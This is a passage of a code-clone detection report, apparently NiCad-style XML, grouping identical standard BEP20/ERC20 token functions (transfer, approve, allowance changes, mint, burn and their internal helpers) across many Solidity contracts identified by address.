</source>
<source file="systems/source-code/0xe022f7a1F743C18e28ABa062FCFa0746CbaE8d32.sol" startline="50" endline="52" pcid="8015">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xd5e370D59C687fcB30943607C3E8f9249ee68619.sol" startline="66" endline="68" pcid="7651">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x0990031433A1C58Ec2A2AFD43154bDD036BA794d.sol" startline="51" endline="53" pcid="273">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xf0c0E88a174A69AA98fd48716CdED5cd14a1af22.sol" startline="50" endline="52" pcid="8808">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xa23e76262e6617dab8caadd452d0f428201267e1.sol" startline="59" endline="61" pcid="5845">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xd85C9321Bdb4D2Ff3b0De51fd17E71E9d64a0dA4.sol" startline="65" endline="67" pcid="7743">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x73Ff82219f9b9ba3fEbe8aed26C159378D4e00B2.sol" startline="55" endline="57" pcid="4266">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x98dBba70df94bC4057a76E29067b5D5D5676f14c.sol" startline="54" endline="56" pcid="5556">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
</class>

<class classid="23" nclones="20" nlines="4" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="411" endline="414" pcid="29">
  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="430" endline="433" pcid="9105">
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="411" endline="414" pcid="9103">
  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="433" endline="436" pcid="8514">
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="431" endline="434" pcid="6409">
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="445" endline="448" pcid="7020">
  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="464" endline="467" pcid="7022">
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="448" endline="451" pcid="7771">
  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="467" endline="470" pcid="7773">
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }
</source>
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="430" endline="433" pcid="31">
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="412" endline="415" pcid="7910">
  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="431" endline="434" pcid="7912">
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="435" endline="438" pcid="3697">
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="335" endline="338" pcid="8111">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="414" endline="417" pcid="8512">
  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="416" endline="419" pcid="3695">
  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="354" endline="357" pcid="8113">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="412" endline="415" pcid="5811">
  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="431" endline="434" pcid="5813">
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="412" endline="415" pcid="6407">
  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
</source>
</class>

<class classid="24" nclones="11" nlines="4" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="465" endline="468" pcid="33">
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="467" endline="470" pcid="9261">
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="466" endline="469" pcid="5815">
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="465" endline="468" pcid="9107">
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="468" endline="471" pcid="8516">
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="389" endline="392" pcid="8115">
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="470" endline="473" pcid="3699">
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="466" endline="469" pcid="6411">
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="466" endline="469" pcid="7914">
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="502" endline="505" pcid="7775">
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="499" endline="502" pcid="7024">
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
</source>
</class>

<class classid="25" nclones="9" nlines="4" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="484" endline="487" pcid="34">
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="485" endline="488" pcid="7915">
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="487" endline="490" pcid="8517">
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="518" endline="521" pcid="7025">
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="489" endline="492" pcid="3700">
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="521" endline="524" pcid="7776">
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="484" endline="487" pcid="9108">
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="485" endline="488" pcid="5816">
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="485" endline="488" pcid="6412">
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }
</source>
</class>

<class classid="26" nclones="7" nlines="4" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="497" endline="500" pcid="35">
  function mint(uint256 amount) public onlyOwner returns (bool) {
    _mint(_msgSender(), amount);
    return true;
  }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="499" endline="502" pcid="9263">
  function mint(uint256 amount) public onlyOwner returns (bool) {
    _mint(_msgSender(), amount);
    return true;
  }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="497" endline="500" pcid="9109">
  function mint(uint256 amount) public onlyOwner returns (bool) {
    _mint(_msgSender(), amount);
    return true;
  }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="498" endline="501" pcid="7916">
  function mint(uint256 amount) public onlyOwner returns (bool) {
    _mint(_msgSender(), amount);
    return true;
  }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="498" endline="501" pcid="5817">
  function mint(uint256 amount) public onlyOwner returns (bool) {
    _mint(_msgSender(), amount);
    return true;
  }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="498" endline="501" pcid="6413">
  function mint(uint256 amount) public onlyOwner returns (bool) {
    _mint(_msgSender(), amount);
    return true;
  }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="500" endline="503" pcid="8518">
  function mint(uint256 amount) public onlyOwner returns (bool) {
    _mint(_msgSender(), amount);
    return true;
  }
</source>
</class>

<class classid="27" nclones="4" nlines="4" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="505" endline="508" pcid="36">
  function burn(uint256 amount) public returns (bool) {
    _burn(_msgSender(), amount);
    return true;
  }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="507" endline="510" pcid="9264">
  function burn(uint256 amount) public returns (bool) {
    _burn(_msgSender(), amount);
    return true;
  }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="505" endline="508" pcid="9110">
  function burn(uint256 amount) public returns (bool) {
    _burn(_msgSender(), amount);
    return true;
  }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="508" endline="511" pcid="8519">
  function burn(uint256 amount) public returns (bool) {
    _burn(_msgSender(), amount);
    return true;
  }
</source>
</class>

<class classid="28" nclones="9" nlines="7" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="524" endline="531" pcid="37">
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="527" endline="534" pcid="8520">
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="518" endline="525" pcid="3701">
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="550" endline="557" pcid="7777">
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="547" endline="554" pcid="7026">
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="517" endline="524" pcid="6414">
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="517" endline="524" pcid="7917">
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="517" endline="524" pcid="5818">
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="524" endline="531" pcid="9111">
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }
</source>
</class>

<class classid="29" nclones="11" nlines="6" similarity="80">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="542" endline="548" pcid="38">
  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");

    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="358" endline="364" pcid="7882">
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="545" endline="551" pcid="8521">
  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");

    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }
</source>
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="358" endline="364" pcid="1986">
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="544" endline="550" pcid="9266">
  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "TRC20: mint to the zero address");

    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="542" endline="548" pcid="9112">
  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");

    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="535" endline="541" pcid="6415">
  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");

    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="535" endline="541" pcid="5819">
  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");

    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="445" endline="451" pcid="8118">
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
</source>
<source file="systems/source-code/0x8EB829589a20Aa412577544cD6e9732087B691AB.sol" startline="277" endline="283" pcid="5238">
    function _mint(address account, uint256 value) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(value);
        _balances[account] = _balances[account].add(value);
        emit Transfer(address(0), account, value);
    }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="535" endline="541" pcid="7918">
  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");

    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }
</source>
</class>

<class classid="30" nclones="9" nlines="6" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="561" endline="567" pcid="39">
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="554" endline="560" pcid="5820">
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="578" endline="584" pcid="7027">
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="561" endline="567" pcid="9113">
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="554" endline="560" pcid="7919">
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="554" endline="560" pcid="6416">
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="581" endline="587" pcid="7778">
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="564" endline="570" pcid="8522">
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="549" endline="555" pcid="3702">
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }
</source>
</class>

<class classid="31" nclones="9" nlines="6" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="582" endline="588" pcid="40">
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="575" endline="581" pcid="7920">
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="575" endline="581" pcid="5821">
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="582" endline="588" pcid="9114">
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="602" endline="608" pcid="7779">
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="585" endline="591" pcid="8523">
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="570" endline="576" pcid="3703">
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="599" endline="605" pcid="7028">
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
</source>
